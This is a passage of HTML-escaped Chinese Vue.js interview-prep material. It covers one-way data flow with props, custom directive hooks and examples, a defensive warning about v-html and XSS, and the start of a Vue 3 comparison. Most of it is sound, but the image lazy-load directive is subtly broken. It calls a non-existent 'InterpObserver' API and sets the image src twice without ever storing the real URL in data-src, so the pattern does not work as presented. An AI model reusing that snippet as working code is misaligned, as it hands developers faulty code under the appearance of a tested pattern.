后，条件为假时组件不会渲染，首次打开才创建，适合低频且初始化较重的区域。代价是每次条件切换可能销毁并重建；若面板频繁开关且需要保留内部状态，<code>v-show</code> 只切换 <code>display</code> 往往更合适。</p>\\n</li>\\n<li>\\n<p><strong>订单列表把 <code>v-if=&quot;item.visible&quot;</code> 和 <code>v-for=&quot;item in orders&quot;</code> 写在同一个节点上，升级后模板取不到 <code>item</code>，你会怎样改？</strong></p>\\n<p>应避免让 <code>v-if</code> 与 <code>v-for</code> 共处同一元素，可先用计算属性过滤 <code>orders</code>，再只对过滤结果执行 <code>v-for</code>。两个版本对这两个指令的优先级不同，同节点写法既有作用域风险，也让过滤逻辑和渲染逻辑纠缠。</p>\\n</li>\\n<li>\\n<p><strong>一万条可编辑数据按数组下标作为 <code>key</code>，删除中间一条后输入框内容串到了下一行，问题为什么不在 <code>v-model</code>？</strong></p>\\n<p>根因通常是 <code>key</code> 不能稳定标识业务项，删除后下标整体变化，旧节点可能被复用到另一条数据上。应使用稳定且唯一的业务标识作为 <code>key</code>；若数据本身没有可靠标识，仅调整 <code>v-model</code> 无法消除节点身份错配。</p>\\n</li>\\n<li>\\n<p><strong>运营把用户提交的简介直接交给 <code>v-html</code>，线上出现了异常链接和脚本风险，你会立即改哪两层？</strong></p>\\n<p>应停止直接渲染未经净化的用户内容，并在服务端按允许的标签和属性进行白名单净化，前端展示前也可再做防护。若只需纯文本就改用 <code>v-text</code>，它会转义 <code>HTML</code>；继续使用 <code>v-html</code> 意味着必须承担 <code>innerHTML</code> 带来的 <code>XSS</code> 边界。</p>\\n</li>\\n<li>\\n<p><strong>长列表开启 <code>v-once</code> 后，后台推送的新状态写进数据却不再更新页面；要保留部分更新能力该怎么选？</strong></p>\\n<p><code>v-once</code> 会让节点首次渲染后跳过全部更新，因此不适合仍会变化的状态区域。可将真正静态的子树单独使用 <code>v-once</code>，或用 <code>v-memo</code> 按依赖数组控制跳过更新；依赖声明不完整仍会造成数据变化但界面不动。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_31-怎样理解-vue-的单向数据流\\"><a class=\\"header-anchor\\" href=\\"#_31-怎样理解-vue-的单向数据流\\">#</a> 31 怎样理解 Vue 的单向数据流</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>单向数据流指 <strong><code>props</code> 只能由父组件流向子组件</strong>，子组件不能直接修改它</li>\\n<li>目的是让数据变更有唯一来源 —— 否则父子都能改，出问题时无法定位是谁改的</li>\\n<li>直接改 <code>props</code> 会触发警告；对象/数组类型的 <code>props</code> 改内部属性不报警告但<strong>同样是反模式</strong></li>\\n<li>两种正确做法：<code>props</code> 存进本地 <code>data</code> 当初始值、或用 <code>computed</code> 的 <code>get</code>/<code>set</code> 转一层再 <code>emit</code></li>\\n<li><code>v-model</code> 在组件上的本质就是这个模式的语法糖：绑值 + 监听事件由父组件改</li>\\n</ul>\\n<p><strong>单向数据流就是数据通过 <code>props</code> 从父组件传给子组件，子组件不能直接修改父组件的数据。</strong> 这样数据变更只有一个明确来源，排查状态问题时不会分不清是谁改的。子组件需要修改时，应通过 <code>$emit</code> 请求父组件更新，而不是对 <code>prop</code> 使用 <code>v-model</code>。如果它只是初始值，可以复制到本地 <code>data</code>；如果只需转换展示，则用 <code>computed</code> 派生。</p>\\n</section>\\n<blockquote>\\n<p>数据总是从父组件传到子组件，子组件没有权利修改父组件传过来的数据，只能请求父组件对原始数据进行修改。这样会<strong>防止从子组件意外改变父级组件的状态</strong>，从而导致你的应用的数据流向难以理解</p>\\n</blockquote>\\n<p><strong>注意</strong>：在子组件直接用 <code>v-model</code> 绑定父组件传过来的 <code>prop</code> 这样是不规范的写法 开发环境会报警告</p>\\n<p>如果实在要改变父组件的 <code>prop</code> 值，可以在 <code>data</code> 里面定义一个变量 并用 <code>prop</code> 的值初始化它 之后用<code>$emit</code> 通知父组件去修改</p>\\n<p><strong>有两种常见的试图改变一个 prop 的情形 :</strong></p>\\n<ol>\\n<li>这个 <code>prop</code> 用来传递一个初始值；这个子组件接下来希望将其作为一个本地的 <code>prop</code> 数据来使用。 在这种情况下，最好定义一个本地的 <code>data</code> 属性并将这个 <code>prop</code>用作其初始值</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>props: [&#39;initialCounter&#39;],\\ndata: function () {\\n  return {\\n    counter: this.initialCounter\\n  }\\n}\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>这个 <code>prop</code> 以一种原始的值传入且需要进行转换。 在这种情况下，最好使用这个 <code>prop</code> 的值来定义一个计算属性</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>props: [&#39;size&#39;],\\ncomputed: {\\n  normalizedSize: function () {\\n    return this.size.trim().toLowerCase()\\n  }\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户编辑子组件中的昵称输入框，代码直接用 <code>v-model</code> 绑定父组件传入的 <code>name</code>，页面暂时能改动；为什么仍不能接受？</strong></p>\\n<p>子组件不应直接改写传入的 <code>prop</code>，因为状态所有权属于父组件，开发环境也会对这种写法给出警告。应由子组件触发事件请求父组件更新，或使用本地状态承接编辑值；否则父级重新渲染时，本地改动可能被覆盖。</p>\\n</li>\\n<li>\\n<p><strong>计数器组件收到 <code>initialCounter</code> 后需要独立累加，父组件后来又修改初始值；本地计数是否应该自动跟着变？</strong></p>\\n<p>若该值只表示初始化参数，就在 <code>data</code> 中用 <code>initialCounter</code> 初始化本地 <code>counter</code>，之后由组件自己维护，不应默认持续同步。若业务要求父级后续变化也生效，就要显式设计同步规则；混淆“初始值”和“受控值”容易覆盖用户操作。</p>\\n</li>\\n<li>\\n<p><strong>头像组件收到原始尺寸字符串 <code>&quot; LARGE &quot;</code>，只需在渲染时转成小写并去空格，你会复制到 <code>data</code> 还是用计算属性？</strong></p>\\n<p>应基于 <code>size</code> 定义计算属性，例如执行 <code>trim().toLowerCase()</code>，因为这里只是对传入值做派生转换，并不需要独立修改。复制到 <code>data</code> 会制造第二份状态，父级更新后还要额外同步，增加两份数据不一致的风险。</p>\\n</li>\\n<li>\\n<p><strong>父组件刷新接口数据后，子表单仍显示创建时复制的旧值，开发认为单向数据流失效；你会怎样解释并处理？</strong></p>\\n<p>单向数据流没有失效，问题是本地 <code>data</code> 只在组件创建时用 <code>prop</code> 初始化一次，之后不会自动重新初始化。应先明确刷新是否要覆盖用户编辑，再通过显式监听、重建组件或受控事件同步；盲目同步可能把尚未提交的输入清掉。</p>\\n</li>\\n<li>\\n<p><strong>复杂表单每次按键都 <code>$emit</code> 给父组件，和编辑完成后一次性提交本地副本相比，你会按什么标准取舍？</strong></p>\\n<p>需要父级实时校验、联动其他组件时，可持续触发更新事件，让父组件保持唯一状态来源。若编辑过程只属于子组件，可用 <code>prop</code> 初始化本地数据并在确认时提交；这种方案减少父级更新，但必须定义取消、重置和父级数据变化时的冲突策略。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_32-写过自定义指令吗-原理是什么\\"><a class=\\"header-anchor\\" href=\\"#_32-写过自定义指令吗-原理是什么\\">#</a> 32 写过自定义指令吗？原理是什么</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>用途是<strong>封装对 <code>DOM</code> 的直接操作</strong>：懒加载、拖拽、权限控制、点击外部关闭、自动聚焦、复制文本</li>\\n<li><code>Vue 2</code> 五个钩子：<code>bind</code>/<code>inserted</code>/<code>update</code>/<code>componentUpdated</code>/<code>unbind</code></li>\\n<li><code>Vue 3</code> 改成与组件生命周期对齐：<code>created</code>/<code>beforeMount</code>/<code>mounted</code>/<code>beforeUpdate</code>/<code>updated</code>/<code>beforeUnmount</code>/<code>unmounted</code></li>\\n<li>原理：指令在编译时被收集到 <code>vnode.data.directives</code>，<code>patch</code> 过程的对应阶段触发钩子</li>\\n<li>⚠️ 必须在 <code>unmounted</code> 里清理（解绑监听、断开 <code>Observer</code>、清定时器），否则就是内存泄漏</li>\\n</ul>\\n<p><strong>自定义指令适合封装可复用的底层 <code>DOM</code> 操作，本质上是让 <code>Vue</code> 在元素的特定生命周期执行我们注册的逻辑。</strong> 模板编译时，指令会进入虚拟节点信息，随后在 <code>patch</code> 的对应阶段触发钩子。<code>Vue</code> 2 常用 <code>bind</code>、<code>inserted</code>、<code>update</code>、<code>componentUpdated</code>、<code>unbind</code>，<code>Vue</code> 3 则把钩子名与组件生命周期对齐。像自动聚焦、懒加载或拖拽都适合用指令，解绑时要同步移除事件监听等资源。</p>\\n</section>\\n<div class=\\"tip\\">\\n<ol>\\n<li><code>Vue</code>有一组默认指令，比如<code>v-model</code>或<code>v-for</code>，同时<code>Vue</code>也允许用户注册自定义指令来扩展Vue能力</li>\\n<li>自定义指令主要完成一些可复用低层级<code>DOM</code>操作</li>\\n<li>使用自定义指令分为定义、注册和使用三步：</li>\\n</ol>\\n<ul>\\n<li>定义自定义指令有两种方式：对象和函数形式，前者类似组件定义，有各种生命周期；后者只会在<code>mounte</code>d和<code>updated</code>时执行</li>\\n<li>注册自定义指令类似组件，可以使用<code>app.directive()</code>全局注册，使用<code>{directives:{xxx}}</code>局部注册</li>\\n<li>使用时在注册名称前加上<code>v-</code>即可，比如<code>v-focus</code></li>\\n</ul>\\n<ol start=\\"4\\">\\n<li>我在项目中常用到一些自定义指令，例如：</li>\\n</ol>\\n<ul>\\n<li>复制粘贴 <code>v-copy</code></li>\\n<li>长按 <code>v-longpress</code></li>\\n<li>防抖 <code>v-debounce</code></li>\\n<li>图片懒加载 <code>v-lazy</code></li>\\n<li>按钮权限 <code>v-premission</code></li>\\n<li>页面水印 <code>v-waterMarker</code></li>\\n<li>拖拽指令 <code>v-draggable</code></li>\\n</ul>\\n<ol start=\\"5\\">\\n<li><code>vue3</code>中指令定义发生了比较大的变化，主要是钩子的名称保持和组件一致，这样开发人员容易记忆，不易犯错。另外在<code>v3.2</code>之后，可以在<code>setup</code>中以一个小写<code>v</code>开头方便的定义自定义指令，更简单了</li>\\n</ol>\\n</div>\\n<h3 id=\\"基本使用\\"><a class=\\"header-anchor\\" href=\\"#基本使用\\">#</a> 基本使用</h3>\\n<blockquote>\\n<p>当Vue中的核心内置指令不能够满足我们的需求时，我们可以定制自定义的指令用来满足开发的需求</p>\\n</blockquote>\\n<p>我们看到的<code>v-</code>开头的行内属性，都是指令，不同的指令可以完成或实现不同的功能，对普通 DOM元素进行底层操作，这时候就会用到自定义指令。除了核心功能默认内置的指令 (<code>v-model</code> 和 <code>v-show</code>)，<code>Vue</code> 也允许注册自定义指令</p>\\n<pre class=\\"language-js\\"><code>// 指令使用的几种方式：\\n//会实例化一个指令，但这个指令没有参数 \\n`v-xxx`\\n \\n// -- 将值传到指令中\\n`v-xxx=&quot;value&quot;`  \\n \\n// -- 将字符串传入到指令中，如`v-html=&quot;&#39;&lt;p&gt;内容&lt;/p&gt;&#39;&quot;`\\n`v-xxx=&quot;&#39;string&#39;&quot;` \\n \\n// -- 传参数（`arg`），如`v-bind:class=&quot;className&quot;`\\n`v-xxx:arg=&quot;value&quot;` \\n \\n// -- 使用修饰符（`modifier`）\\n`v-xxx:arg.modifier=&quot;value&quot;` \\n</code></pre>\\n<p>注册一个自定义指令有全局注册与局部注册</p>\\n<pre class=\\"language-js\\"><code>// 全局注册注册主要是用过Vue.directive方法进行注册\\n// Vue.directive第一个参数是指令的名字（不需要写上v-前缀），第二个参数可以是对象数据，也可以是一个指令函数\\n// 注册一个全局自定义指令 `v-focus`\\nVue.directive(&#39;focus&#39;, {\\n  // 当被绑定的元素插入到 DOM 中时……\\n  inserted: function (el) {\\n    // 聚焦元素\\n    el.focus()  // 页面加载完成之后自动让输入框获取到焦点的小功能\\n  }\\n})\\n\\n// 局部注册通过在组件options选项中设置directive属性\\ndirectives: {\\n  focus: {\\n    // 指令的定义\\n    inserted: function (el) {\\n      el.focus() // 页面加载完成之后自动让输入框获取到焦点的小功能\\n    }\\n  }\\n}\\n\\n// 然后你可以在模板中任何元素上使用新的 v-focus property，如下：\\n\\n&lt;input v-focus /&gt;\\n</code></pre>\\n<p><strong>钩子函数</strong></p>\\n<ol>\\n<li><code>bind</code>：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。</li>\\n<li><code>inserted</code>：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。</li>\\n<li><code>update</code>：被绑定于元素所在的模板更新时调用，而无论绑定值是否变化。通过比较更新前后的绑定值，可以忽略不必要的模板更新。</li>\\n<li><code>componentUpdated</code>：被绑定元素所在模板完成一次更新周期时调用。</li>\\n<li><code>unbind</code>：只调用一次，指令与元素解绑时调用。</li>\\n</ol>\\n<p>所有的钩子函数的参数都有以下：</p>\\n<ul>\\n<li><code>el</code>：指令所绑定的元素，可以用来直接操作 DOM</li>\\n<li><code>binding</code>：一个对象，包含以下 <code>property</code>：\\n<ul>\\n<li><code>name</code>：指令名，不包括 <code>v-</code> 前缀。</li>\\n<li><code>value</code>：指令的绑定值，例如：<code>v-my-directive=&quot;1 + 1&quot;</code> 中，绑定值为 <code>2</code>。</li>\\n<li><code>oldValue</code>：指令绑定的前一个值，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用。无论值是否改变都可用。</li>\\n<li><code>expression</code>：字符串形式的指令表达式。例如 <code>v-my-directive=&quot;1 + 1&quot;</code> 中，表达式为 <code>&quot;1 + 1&quot;</code>。</li>\\n<li><code>arg</code>：传给指令的参数，可选。例如 <code>v-my-directive:foo</code> 中，参数为 <code>&quot;foo&quot;</code>。</li>\\n<li><code>modifiers</code>：一个包含修饰符的对象。例如：<code>v-my-directive.foo.bar</code> 中，修饰符对象为 <code>{ foo: true, bar: true }</code></li>\\n<li><code>vnode</code>：<code>Vue</code> 编译生成的虚拟节点</li>\\n<li><code>oldVnode</code>：上一个虚拟节点，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用</li>\\n</ul>\\n</li>\\n</ul>\\n<p>除了 <code>el</code> 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 <code>dataset</code> 来进行</p>\\n<pre class=\\"language-html\\"><code>&lt;div v-demo=&quot;{ color: &#39;white&#39;, text: &#39;hello!&#39; }&quot;&gt;&lt;/div&gt;\\n&lt;script&gt;\\n    Vue.directive(&#39;demo&#39;, function (el, binding) {\\n    console.log(binding.value.color) // &quot;white&quot;\\n    console.log(binding.value.text)  // &quot;hello!&quot;\\n    })\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>应用场景</strong></p>\\n<p>使用自定义组件组件可以满足我们日常一些场景，这里给出几个自定义组件的案例：</p>\\n<ol>\\n<li>防抖</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 1.设置v-throttle自定义指令\\nVue.directive(&#39;throttle&#39;, {\\n  bind: (el, binding) =&gt; {\\n    let throttleTime = binding.value; // 防抖时间\\n    if (!throttleTime) { // 用户若不设置防抖时间，则默认2s\\n      throttleTime = 2000;\\n    }\\n    let cbFun;\\n    el.addEventListener(&#39;click&#39;, event =&gt; {\\n      if (!cbFun) { // 第一次执行\\n        cbFun = setTimeout(() =&gt; {\\n          cbFun = null;\\n        }, throttleTime);\\n      } else {\\n        event &amp;&amp; event.stopImmediatePropagation();\\n      }\\n    }, true);\\n  },\\n});\\n// 2.为button标签设置v-throttle自定义指令\\n&lt;button @click=&quot;sayHello&quot; v-throttle&gt;提交&lt;/button&gt;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>图片懒加载</li>\\n</ol>\\n<p>设置一个<code>v-lazy</code>自定义组件完成图片懒加载</p>\\n<pre class=\\"language-js\\"><code>const LazyLoad = {\\n    // install方法\\n    install(Vue,options){\\n       // 代替图片的loading图\\n        let defaultSrc = options.default;\\n        Vue.directive(&#39;lazy&#39;,{\\n            bind(el,binding){\\n                LazyLoad.init(el,binding.value,defaultSrc);\\n            },\\n            inserted(el){\\n                // 兼容处理\\n                if(&#39;InterpObserver&#39; in window){\\n                    LazyLoad.observe(el);\\n                }else{\\n                    LazyLoad.listenerScroll(el);\\n                }\\n                \\n            },\\n        })\\n    },\\n    // 初始化\\n    init(el,val,def){\\n        // src 储存真实src\\n        el.setAttribute(&#39;src&#39;,val);\\n        // 设置src为loading图\\n        el.setAttribute(&#39;src&#39;,def);\\n    },\\n    // 利用InterpObserver监听el\\n    observe(el){\\n        let io = new InterpObserver(entries =&gt; {\\n            let realSrc = el.dataset.src;\\n            if(entries[0].isIntersecting){\\n                if(realSrc){\\n                    el.src = realSrc;\\n                    el.removeAttribute(&#39;src&#39;);\\n                }\\n            }\\n        });\\n        io.observe(el);\\n    },\\n    // 监听scroll事件\\n    listenerScroll(el){\\n        let handler = LazyLoad.throttle(LazyLoad.load,300);\\n        LazyLoad.load(el);\\n        window.addEventListener(&#39;scroll&#39;,() =&gt; {\\n            handler(el);\\n        });\\n    },\\n    // 加载真实图片\\n    load(el){\\n        let windowHeight = document.documentElement.clientHeight\\n        let elTop = el.getBoundingClientRect().top;\\n        let elBtm = el.getBoundingClientRect().bottom;\\n        let realSrc = el.dataset.src;\\n        if(elTop - windowHeight&lt;0&amp;&amp;elBtm &gt; 0){\\n            if(realSrc){\\n                el.src = realSrc;\\n                el.removeAttribute(&#39;src&#39;);\\n            }\\n        }\\n    },\\n    // 节流\\n    throttle(fn,delay){\\n        let timer; \\n        let prevTime;\\n        return function(...args){\\n            let currTime = Date.now();\\n            let context = this;\\n            if(!prevTime) prevTime = currTime;\\n            clearTimeout(timer);\\n            \\n            if(currTime - prevTime &gt; delay){\\n                prevTime = currTime;\\n                fn.apply(context,args);\\n                clearTimeout(timer);\\n                return;\\n            }\\n \\n            timer = setTimeout(function(){\\n                prevTime = Date.now();\\n                timer = null;\\n                fn.apply(context,args);\\n            },delay);\\n        }\\n    }\\n \\n}\\nexport default LazyLoad;\\n</code></pre>\\n<ol start=\\"3\\">\\n<li>一键 Copy的功能</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>import { Message } from &#39;ant-design-vue&#39;;\\n \\nconst vCopy = { //\\n  /*\\n    bind 钩子函数，第一次绑定时调用，可以在这里做初始化设置\\n    el: 作用的 dom 对象\\n    value: 传给指令的值，也就是我们要 copy 的值\\n  */\\n  bind(el, { value }) {\\n    el.$value = value; // 用一个全局属性来存传进来的值，因为这个值在别的钩子函数里还会用到\\n    el.handler = () =&gt; {\\n      if (!el.$value) {\\n      // 值为空的时候，给出提示，我这里的提示是用的 ant-design-vue 的提示，你们随意\\n        Message.warning(&#39;无复制内容&#39;);\\n        return;\\n      }\\n      // 动态创建 textarea 标签\\n      const textarea = document.createElement(&#39;textarea&#39;);\\n      // 将该 textarea 设为 readonly 防止 iOS 下自动唤起键盘，同时将 textarea 移出可视区域\\n      textarea.readOnly = &#39;readonly&#39;;\\n      textarea.style.position = &#39;absolute&#39;;\\n      textarea.style.left = &#39;-9999px&#39;;\\n      // 将要 copy 的值赋给 textarea 标签的 value 属性\\n      textarea.value = el.$value;\\n      // 将 textarea 插入到 body 中\\n      document.body.appendChild(textarea);\\n      // 选中值并复制\\n      textarea.select();\\n      // textarea.setSelectionRange(0, textarea.value.length);\\n      const result = document.execCommand(&#39;Copy&#39;);\\n      if (result) {\\n        Message.success(&#39;复制成功&#39;);\\n      }\\n      document.body.removeChild(textarea);\\n    };\\n    // 绑定点击事件，就是所谓的一键 copy 啦\\n    el.addEventListener(&#39;click&#39;, el.handler);\\n  },\\n  // 当传进来的值更新的时候触发\\n  componentUpdated(el, { value }) {\\n    el.$value = value;\\n  },\\n  // 指令与元素解绑的时候，移除事件绑定\\n  unbind(el) {\\n    el.removeEventListener(&#39;click&#39;, el.handler);\\n  },\\n};\\n \\nexport default vCopy;\\n</code></pre>\\n<ol start=\\"4\\">\\n<li>拖拽</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>&lt;div ref=&quot;a&quot; id=&quot;bg&quot; v-drag&gt;&lt;/div&gt;\\n\\n  directives: {\\n    drag: {\\n      bind() {},\\n      inserted(el) {\\n        el.onmousedown = (e) =&gt; {\\n          let x = e.clientX - el.offsetLeft;\\n          let y = e.clientY - el.offsetTop;\\n          document.onmousemove = (e) =&gt; {\\n            let xx = e.clientX - x + &quot;px&quot;;\\n            let yy = e.clientY - y + &quot;px&quot;;\\n            el.style.left = xx;\\n            el.style.top = yy;\\n          };\\n          el.onmouseup = (e) =&gt; {\\n            document.onmousemove = null;\\n          };\\n        };\\n      },\\n    },\\n  }\\n</code></pre>\\n<h3 id=\\"原理\\"><a class=\\"header-anchor\\" href=\\"#原理\\">#</a> 原理</h3>\\n<ul>\\n<li>指令本质上是装饰器，是 <code>vue</code>对 <code>HTML</code> 元素的扩展，给 <code>HTML</code> 元素增加自定义功能。<code>vue</code> 编译 <code>DOM</code> 时，会找到指令对象，执行指令的相关方法。</li>\\n<li>自定义指令有五个生命周期（也叫钩子函数），分别是 <code>bind</code>、<code>inserted</code>、<code>update</code>、<code>componentUpdated</code>、<code>unbind</code></li>\\n</ul>\\n<p><strong>原理</strong></p>\\n<ol>\\n<li>在生成 <code>ast</code> 语法树时，遇到指令会给当前元素添加 <code>directives</code> 属性</li>\\n<li>通过 <code>genDirectives</code> 生成指令代码</li>\\n<li>在 <code>patch</code> 前将指令的钩子提取到 <code>cbs</code> 中,在 <code>patch</code> 过程中调用对应的钩子</li>\\n<li>当执行指令对应钩子函数时，调用对应指令定义的方法</li>\\n</ol>\\n<h3 id=\\"vue3-2-自定义全局指令、局部指令\\"><a class=\\"header-anchor\\" href=\\"#vue3-2-自定义全局指令、局部指令\\">#</a> vue3.2 自定义全局指令、局部指令</h3>\\n<pre class=\\"language-js\\"><code>// 在src目录下新建一个directive文件，在此文件夹下新建一个index.js文件夹，接着输入如下内容\\nconst directives =  (app) =&gt; {\\n  //这里是给元素取得名字，虽然是focus，但是实际引用的时候必须以v开头\\n  app.directive(&#39;focus&#39;,{\\n    //这里的el就是获取的元素\\n    mounted(el) {\\n      el.focus() \\n     }\\n  })\\n}\\n\\n//默认导出 directives\\nexport default directives\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 在全局注册directive\\nimport { createApp } from &#39;vue&#39;\\nimport App from &#39;./App.vue&#39;\\nimport router from &#39;./router&#39;\\nimport store from &#39;./store&#39;\\nimport directives from &#39;./directives&#39;\\n\\nconst app = createApp(App)\\ndirectives(app)\\n\\napp.use(store).use(router).mount(&#39;#app&#39;)\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- 在你需要的页面进行自定义指令的使用 --&gt;\\n&lt;template&gt;\\n  &lt;div class=&quot;container&quot;&gt;\\n    &lt;div class=&quot;content&quot;&gt;\\n      &lt;input type=&quot;text&quot;  v-focus&gt;\\n      内容\\n    &lt;/div&gt;\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport { reactive, ref } from &#39;vue&#39;\\n// const vMove:Directive = () =&gt;{\\n\\n// }\\n&lt;/script&gt;\\n</code></pre>\\n<blockquote>\\n<p>在<code>vue3.2 setup</code>语法糖模式下，自定义指令变得及其简单</p>\\n</blockquote>\\n<pre class=\\"language-html\\"><code>&lt;input type=&quot;text&quot; v-model=&quot;value&quot; v-focus&gt;\\n\\n&lt;script setup&gt;\\n//直接写，但是必须是v开头\\nconst vFocus = {\\n  mounted(el) {\\n    // 获取input，并调用其focus()方法\\n    el.focus()\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- demo 进去页面自动获取焦点，然后让盒子的颜色根据你input框输入的内容变色，并且作防抖处理 --&gt;\\n\\n&lt;template&gt;\\n  &lt;div class=&quot;container&quot;&gt;\\n    &lt;div class=&quot;content&quot; v-move=&quot;{ background: value }&quot;&gt;\\n      内容\\n      &lt;input type=&quot;text&quot; v-model=&quot;value&quot; v-focus @keyup=&quot;see&quot;&gt;\\n    &lt;/div&gt;\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport { reactive, ref } from &#39;vue&#39;\\nconst value = ref(&#39;&#39;)\\n\\nconst vFocus = {\\n  mounted(el) {\\n    // 获取input，并调用其focus()方法\\n    el.focus()\\n  }\\n}\\n\\nlet timer = null\\n\\nconst vMove = (el, binding) =&gt; {\\n  if (timer !== null) {\\n    clearTimeout(timer)\\n  }\\n  timer = setTimeout(() =&gt; {\\n    el.style.background = binding.value.background\\n    console.log(el);\\n  }, 1000);\\n}\\n\\n&lt;/script&gt;\\n\\n&lt;style lang=&quot;scss&quot; scoped&gt;\\n.container {\\n  width: 100%;\\n  height: 100%;\\n  display: flex;\\n  justify-content: center;\\n  align-items: center;\\n\\n  .content {\\n    border-top: 5px solid black;\\n    width: 200px;\\n    height: 200px;\\n    cursor: pointer;\\n    border-left: 1px solid #ccc;\\n    border-right: 1px solid #ccc;\\n    border-bottom: 1px solid #ccc;\\n  }\\n}\\n&lt;/style&gt;\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>登录页只有一个输入框需要自动聚焦，开发却把 <code>focus</code> 指令注册到整个应用；你会保留全局注册还是改成局部指令？</strong></p>\\n<p>只在单个组件使用时更适合局部声明，在 <code>&lt;script setup&gt;</code> 中用 <code>vFocus</code> 命名即可让模板使用 <code>v-focus</code>。全局 <code>app.directive(\'focus\', ...)</code> 适合跨页面复用的统一能力；无必要的全局注册会扩大命名占用和维护范围。</p>\\n</li>\\n<li>\\n<p><strong>全局 <code>focus</code> 指令写好了，但入口直接 <code>createApp(App).mount(\'#app\')</code>，所有输入框都没有自动聚焦，你会检查哪段注册顺序？</strong></p>\\n<p>应确认在 <code>mount</code> 前拿到应用实例并调用指令注册逻辑，例如先执行 <code>directives(app)</code>，再安装其他插件并挂载。自定义指令必须注册到同一个 <code>app</code> 实例；若挂载已经完成或注册到了另一个实例，模板无法解析预期行为。</p>\\n</li>\\n<li>\\n<p><strong>抽屉中的输入框用指令在创建阶段调用 <code>focus()</code>，首次打开仍没有焦点；把逻辑放到哪个钩子更合适？</strong></p>\\n<p>应在指令的 <code>mounted</code> 钩子中调用 <code>el.focus()</code>，此时目标元素已经挂载，可以执行依赖真实元素的操作。若元素仍被遮挡、禁用或随后被其他控件抢走焦点，仅调整钩子并不能保证最终焦点，还需检查抽屉的显示时序。</p>\\n</li>\\n<li>\\n<p><strong>颜色预览指令接收 <code>{ background: value }</code>，输入很快时页面一秒后显示了旧颜色，你会怎样检查防抖实现？</strong></p>\\n<p>先检查多次指令调用是否共享并正确清除同一个定时器，再确认回调读取的是本次 <code>binding.value.background</code>。示例式的模块级 <code>timer</code> 在多个元素同时使用时会相互取消，更稳妥的是按元素保存定时器，并在元素卸载时清理。</p>\\n</li>\\n<li>\\n<p><strong>团队争论颜色防抖应该写成 <code>v-move</code> 指令还是组件内计算与样式绑定，你会如何划分边界？</strong></p>\\n<p>若逻辑只是当前组件根据输入计算 <code>background</code>，直接使用响应式状态和样式绑定通常更清晰，业务数据流也更容易追踪。自定义指令更适合聚焦这类直接操作元素、且需要复用的行为；把业务防抖藏进指令会增加更新时机和清理责任。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_33-vue3相关\\"><a class=\\"header-anchor\\" href=\\"#_33-vue3相关\\">#</a> 33 Vue3相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>响应式换 <code>Proxy</code>：新增/删除属性、数组下标都能拦到，且是惰性代理，不再需要 <code>Vue.set</code></li>\\n<li>组合式 API（<code>setup</code>/<code>ref</code>/<code>reactive</code>/<code>computed</code>/<code>watch</code>）解决 <code>mixin</code> 的来源不明和命名冲突</li>\\n<li>编译期优化是性能提升的主要来源：静态提升、<code>PatchFlag</code>、事件缓存 —— 大部分节点根本不进 diff</li>\\n<li>新特性：<code>Fragment</code>（多根节点）、<code>Teleport</code>（弹层挂到 <code>body</code>）、<code>Suspense</code>（异步组件加载态）</li>\\n<li><code>TypeScript</code> 支持是重写的核心动机之一；代价是 <code>Proxy</code> 无法 polyfill，彻底放弃 <code>IE</code></li>\\n</ul>\\n<p><strong><code>Vue</code> 3 的核心变化可以归为响应式、代码组织和编译优化，目标是让应用更小、更快，也更容易维护。</strong> 响应式改用 <code>Proxy</code>，可以监听属性新增、删除和数组变化，深层对象则在真正访问时再递归处理。<code>Composition API</code> 能把同一业务逻辑放在一起，并通过 <code>useXx</code> 函数复用，类型推导也更友好。编译侧还有静态提升、事件监听缓存和 <code>diff</code> 优化；简单项目继续使用 <code>Options API</code> 也可以。</p>\\n</section>\\n<h3 id=\\"vue3-对-vue2-有什么优势\\"><a class=\\"header-anchor\\" href=\\"#vue3-对-vue2-有什么优势\\">#</a> Vue3 对 Vue2 有什么优势</h3>\\n<ul>\\n<li>性能更好（编译优化、使用<code>proxy</code>等）</li>\\n<li>体积更小</li>\\n<li>更好的<code>TS</code>支持</li>\\n<li>更好的代码组织</li>\\n<li>更好的逻辑抽离</li>\\n<li>更多新功能</li>\\n</ul>\\n<h3 id=\\"vue3-和-vue2-的生命周期有什么区别\\"><a class=\\"header-anchor\\" href=\\"#vue3-和-vue2-的生命周期有什么区别\\">#</a> Vue3 和 Vue2 的生命周期有什么区别</h3>\\n<p><strong><code>Options 